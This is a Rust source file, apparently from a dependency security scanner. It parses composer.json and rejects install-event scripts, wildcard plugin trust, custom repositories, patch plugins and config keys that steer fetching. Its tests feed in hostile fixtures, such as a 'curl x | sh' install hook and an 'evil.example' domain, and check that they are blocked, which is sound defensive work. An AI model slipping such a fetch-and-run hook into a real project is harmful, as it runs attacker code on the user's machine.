use crate::Dependency;
use crate::config_surface::{AppliedAllow, KeyAllow, check_json};
use anyhow::{Context, Result};
use std::path::Path;

/// Strict form of [`parse_with`]: no operator allows.
pub fn parse(project_dir: &Path) -> Result<Vec<Dependency>> {
    parse_with(project_dir, &[]).map(|(deps, _)| deps)
}

/// Parse `composer.json`, applying the operator's `config_key_allow` entries to its `config`
/// object. Returns the allows that were applied, to be reported as warnings.
pub(crate) fn parse_with(
    project_dir: &Path,
    allows: &[KeyAllow],
) -> Result<(Vec<Dependency>, Vec<AppliedAllow>)> {
    let path = project_dir.join("composer.json");
    let content = super::read_file_limited(&path, super::MAX_MANIFEST_BYTES)
        .context("Failed to read composer.json")?;
    let parsed: serde_json::Value =
        serde_json::from_str(&content).context("Failed to parse composer.json")?;
    let applied = validate_supported_sources(&parsed, &path, allows)?;

    let mut deps = Vec::new();

    for section in ["require", "require-dev"] {
        if let Some(obj) = parsed.get(section).and_then(|v| v.as_object()) {
            for (name, version) in obj {
                if is_platform_package(name) {
                    continue;
                }
                let version = version.as_str().ok_or_else(|| {
                    anyhow::anyhow!(
                        "Unsupported Composer dependency '{}' in {}: only string version constraints are supported",
                        crate::report::sanitize_for_terminal(name),
                        path.display()
                    )
                })?;
                let dep = Dependency {
                    name: name.clone(),
                    version: Some(version.to_string()),
                    ecosystem: crate::Ecosystem::Php,
                    actual_name: None,
                };
                super::validate_dependency(&dep, &path)?;
                deps.push(dep);
            }
        }
    }

    Ok((deps, applied))
}

/// Composer platform packages describe the runtime and are never downloaded
/// from Packagist. They never contain a vendor `/`, so a real package cannot
/// hide behind these names.
fn is_platform_package(name: &str) -> bool {
    !name.contains('/')
        && (matches!(
            name,
            "php"
                | "php-64bit"
                | "php-ipv6"
                | "php-zts"
                | "php-debug"
                | "hhvm"
                | "composer"
                | "composer-plugin-api"
                | "composer-runtime-api"
        ) || name.starts_with("ext-")
            || name.starts_with("lib-"))
}

fn validate_supported_sources(
    parsed: &serde_json::Value,
    path: &Path,
    allows: &[KeyAllow],
) -> Result<Vec<AppliedAllow>> {
    let has_custom_repositories = parsed.get("repositories").is_some_and(|value| match value {
        serde_json::Value::Array(entries) => !entries.is_empty(),
        serde_json::Value::Object(entries) => !entries.is_empty(),
        _ => true,
    });

    if has_custom_repositories {
        anyhow::bail!(
            "Unsupported Composer repositories in {}: custom package sources are not supported",
            path.display()
        );
    }

    reject_install_time_code(parsed, path, allows)
}

/// Whether a root script key names a Composer event rather than a custom `composer run` script.
/// Composer runs root scripts for every event it dispatches, including the command and
/// plugin events (`pre-command-run`, `post-file-download`, `pre-pool-create`, ...), so every
/// `pre-`/`post-` key and the bare `init`/`command` events count.
fn is_event_name(key: &str) -> bool {
    key.starts_with("pre-") || key.starts_with("post-") || matches!(key, "init" | "command")
}

/// Scripts bound to install events and blanket plugin trust execute code that no scan sees.
fn reject_install_time_code(
    parsed: &serde_json::Value,
    path: &Path,
    allows: &[KeyAllow],
) -> Result<Vec<AppliedAllow>> {
    if let Some(scripts) = parsed.get("scripts").and_then(|value| value.as_object())
        && let Some(event) = scripts.keys().find(|key| {
            is_event_name(key)
                && scripts.get(*key).is_some_and(|value| match value {
                    serde_json::Value::Array(entries) => !entries.is_empty(),
                    serde_json::Value::String(text) => !text.is_empty(),
                    _ => true,
                })
        })
    {
        anyhow::bail!(
            "Unsupported Composer script in {}: '{}' runs unscanned code during install",
            path.display(),
            event
        );
    }
    let blanket = match parsed.pointer("/config/allow-plugins") {
        Some(serde_json::Value::Bool(allowed)) => *allowed,
        Some(serde_json::Value::Object(plugins)) => plugins
            .iter()
            .any(|(pattern, value)| pattern.contains('*') && value.as_bool() == Some(true)),
        _ => false,
    };
    if blanket {
        anyhow::bail!(
            "Unsupported Composer config in {}: allow-plugins permits every plugin to run unscanned code",
            path.display()
        );
    }
    let applied = check_config_surface(parsed, path, allows)?;
    reject_patches(parsed, path)?;
    Ok(applied)
}

/// The `config` object is held to the allowlist in `composer_surface`.
fn check_config_surface(
    parsed: &serde_json::Value,
    path: &Path,
    allows: &[KeyAllow],
) -> Result<Vec<AppliedAllow>> {
    let Some(config) = parsed.get("config") else {
        return Ok(Vec::new());
    };
    if !config.is_object() {
        anyhow::bail!(
            "Unsupported Composer config in {}: 'config' is not an object",
            path.display()
        );
    }
    check_json(
        &super::composer_surface::COMPOSER_CONFIG,
        config,
        path,
        allows,
    )
}

/// Patch plugins (cweagans/composer-patches, vaimo/composer-patches) change installed code
/// after download; no scan sees the patch.
fn reject_patches(parsed: &serde_json::Value, path: &Path) -> Result<()> {
    let Some(extra) = parsed.get("extra").and_then(|value| value.as_object()) else {
        return Ok(());
    };
    let non_empty = |value: &serde_json::Value| match value {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(flag) => *flag,
        serde_json::Value::Array(entries) => !entries.is_empty(),
        serde_json::Value::Object(entries) => !entries.is_empty(),
        serde_json::Value::String(text) => !text.is_empty(),
        serde_json::Value::Number(_) => true,
    };
    for key in [
        "patches",
        "patches-file",
        "patches-ignore",
        "patches-dev",
        "patcher",
        "enable-patching",
    ] {
        if extra.get(key).is_some_and(non_empty) {
            anyhow::bail!(
                "Unsupported Composer extra in {}: '{key}' patches installed packages with code no scan sees",
                path.display()
            );
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parsers::test_utils::*;

    fn setup_dir(content: &str) -> std::path::PathBuf {
        setup_test_dir("composer", "composer.json", content)
    }

    #[test]
    fn parse_require_and_require_dev() {
        let dir = setup_dir(
            r#"{
            "require": {"laravel/framework": "^10.0", "guzzlehttp/guzzle": "^7.0"},
            "require-dev": {"phpunit/phpunit": "^10.0"}
        }"#,
        );
        let deps = parse(&dir).unwrap();
        assert_eq!(deps.len(), 3);
        let names: Vec<_> = deps.iter().map(|d| d.name.as_str()).collect();
        assert!(names.contains(&"laravel/framework"));
        assert!(names.contains(&"phpunit/phpunit"));
        assert_eq!(deps[0].ecosystem, crate::Ecosystem::Php);
        cleanup(&dir);
    }

    #[test]
    fn skip_php_and_ext_entries() {
        let dir = setup_dir(
            r#"{
            "require": {"php": "^8.1", "ext-json": "*", "laravel/framework": "^10.0"}
        }"#,
        );
        let deps = parse(&dir).unwrap();
        assert_eq!(deps.len(), 1);
        assert_eq!(deps[0].name, "laravel/framework");
        cleanup(&dir);
    }

    #[test]
    fn skip_all_composer_platform_packages() {
        let dir = setup_dir(
            r#"{
            "require": {
                "php-64bit": "^8.1",
                "composer-plugin-api": "^2.0",
                "composer-runtime-api": "^2.2",
                "composer": "^2.0",
                "lib-openssl": "*",
                "lib-icu": ">=60",
                "laravel/framework": "^10.0"
            }
        }"#,
        );
        let deps = parse(&dir).unwrap();
        let names: Vec<_> = deps.iter().map(|d| d.name.as_str()).collect();
        assert_eq!(names, vec!["laravel/framework"]);
        cleanup(&dir);
    }

    #[test]
    fn handle_missing_sections() {
        let dir = setup_dir(r#"{"name": "test/pkg", "description": "test"}"#);
        let deps = parse(&dir).unwrap();
        assert!(deps.is_empty());
        cleanup(&dir);
    }

    #[test]
    fn install_event_scripts_block_but_other_scripts_do_not() {
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "scripts": {"post-install-cmd": ["curl x | sh"]}}"#,
        );
        let err = parse(&dir).unwrap_err().to_string();
        assert!(err.contains("post-install-cmd"), "{err}");
        cleanup(&dir);

        let dir = setup_dir(r#"{"require": {"a/b": "^1.0"}, "scripts": {"test": "phpunit"}}"#);
        assert!(parse(&dir).is_ok());
        cleanup(&dir);
    }

    #[test]
    fn plugin_and_command_events_block_like_install_events() {
        for event in [
            "pre-command-run",
            "post-file-download",
            "pre-pool-create",
            "init",
        ] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "scripts": {{"{event}": "curl x | sh"}}}}"#
            ));
            assert!(parse(&dir).is_err(), "{event}");
            cleanup(&dir);
        }
    }

    #[test]
    fn wildcard_allow_plugins_patterns_block() {
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"allow-plugins": {"*/*": true}}}"#,
        );
        assert!(parse(&dir).is_err());
        cleanup(&dir);
    }

    #[test]
    fn blanket_allow_plugins_blocks_but_named_plugins_do_not() {
        for blanket in [r#"true"#, r#"{"*": true}"#] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "config": {{"allow-plugins": {blanket}}}}}"#
            ));
            assert!(parse(&dir).is_err(), "{blanket}");
            cleanup(&dir);
        }
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"allow-plugins": {"a/b": true}}}"#,
        );
        assert!(parse(&dir).is_ok());
        cleanup(&dir);
    }

    #[test]
    fn cache_and_fetch_steering_config_blocks() {
        for config in [
            r#"{"cache-dir": "repo-cache"}"#,
            r#"{"cache-files-dir": "x"}"#,
            r#"{"cache-repo-dir": "x"}"#,
            r#"{"cache-vcs-dir": "x"}"#,
            r#"{"data-dir": "x"}"#,
            r#"{"disable-tls": true}"#,
            r#"{"disable-tls": "yes"}"#,
            r#"{"secure-http": false}"#,
            r#"{"cafile": "ca.pem"}"#,
            r#"{"capath": "certs"}"#,
            r#"{"github-domains": ["evil.example"]}"#,
            r#"{"gitlab-domains": ["evil.example"]}"#,
            r#"{"github-protocols": ["git"]}"#,
        ] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "config": {config}}}"#
            ));
            assert!(parse(&dir).is_err(), "{config}");
        }
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"sort-packages": true, "disable-tls": false, "secure-http": true, "optimize-autoloader": true}}"#,
        );
        parse(&dir).unwrap();
    }

    #[test]
    fn an_unlisted_config_key_blocks_until_the_operator_allows_it() {
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "config": {"github-oauth": {"github.com": "t"}}}"#,
        );
        let err = parse(&dir).unwrap_err().to_string();
        assert!(
            err.contains("Unsupported Composer config 'github-oauth.github.com'"),
            "{err}"
        );
        let allow = |key: &str| KeyAllow {
            file: "composer.json".to_string(),
            key: key.to_string(),
        };
        let (deps, applied) = parse_with(&dir, &[allow("github-oauth.github.com")]).unwrap();
        assert_eq!(deps.len(), 1);
        assert_eq!(applied.len(), 1);
        assert!(parse_with(&dir, &[allow("github-oauth")]).is_err());
        cleanup(&dir);
        // Denied keys stay blocked whatever the operator allows.
        let dir = setup_dir(r#"{"require": {"a/b": "^1.0"}, "config": {"cache-dir": "c"}}"#);
        assert!(parse_with(&dir, &[allow("cache-dir")]).is_err());
        cleanup(&dir);
    }

    #[test]
    fn patch_plugin_configuration_blocks() {
        for extra in [
            r#"{"patches": {"a/b": {"x": "patches/evil.patch"}}}"#,
            r#"{"patches-file": "patches.json"}"#,
            r#"{"patches-ignore": {"c/d": {"a/b": {"x": "y"}}}}"#,
            r#"{"patcher": {"search": "patches"}}"#,
            r#"{"enable-patching": true}"#,
        ] {
            let dir = setup_dir(&format!(
                r#"{{"require": {{"a/b": "^1.0"}}, "extra": {extra}}}"#
            ));
            assert!(parse(&dir).is_err(), "{extra}");
        }
        let dir = setup_dir(
            r#"{"require": {"a/b": "^1.0"}, "extra": {"patches": {}, "branch-alias": {"dev-main": "1.x-dev"}}}"#,
        );
        parse(&dir).unwrap();
    }
}
